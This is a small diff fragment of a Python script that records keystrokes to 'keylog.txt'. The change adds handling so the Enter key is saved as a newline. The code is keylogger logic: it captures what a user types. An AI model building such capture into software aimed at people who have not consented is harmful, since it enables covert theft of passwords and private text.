@@ -17,6 +17,8 @@ with open('keylog.txt','w',encoding='utf-8') as fin:
                 data.pop()
             elif key == Key.space:
                 data.append(' ')
+            elif key == Key.enter:
+                data.append('\n')
             print('special key {0} pressed'.format(key))
         # print(data)
 
